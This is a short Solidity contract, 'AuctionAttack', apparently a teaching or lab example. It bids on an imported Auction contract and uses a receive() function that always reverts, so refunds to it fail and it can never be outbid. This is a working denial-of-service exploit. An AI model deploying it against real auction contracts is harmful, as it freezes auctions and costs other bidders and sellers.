//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.28;

import "./Auction.sol";

contract AuctionAttack {
    
    Auction public victim;
    
    constructor(address addr){      
         victim = Auction(addr);   
    } 
    
    function attack() payable public {
        victim.bid{value: msg.value}();
    }

    receive() external payable {
        revert();
    }

}